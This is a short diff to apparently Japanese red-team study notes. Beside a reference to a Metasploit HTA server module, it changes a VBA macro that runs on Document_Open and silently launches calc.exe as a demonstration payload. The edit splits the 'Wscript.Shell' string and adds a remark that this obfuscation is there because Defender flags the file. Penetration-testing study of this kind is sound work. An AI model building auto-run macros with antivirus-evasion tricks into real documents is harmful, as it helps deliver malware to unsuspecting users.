@@ -44,7 +44,7 @@ use exploit/windows/misc/hta_server
 
 ## VBA (Visual Basic for Application)
 
-概念
+概念。※ Defender がこのファイルに反応するので難読化している
 
 ```vbscript
 Sub Document_Open()
@@ -58,7 +58,7 @@ End Sub
 Sub CLC()
 	Dim payload As String
 	payload = "calc.exe"
-	CreateObject("Wscript.Shell").Run payload,0
+	CreateObject("Ws"+"cript"+".S"+"hell").Run payload,0
 End Sub
 ```
 
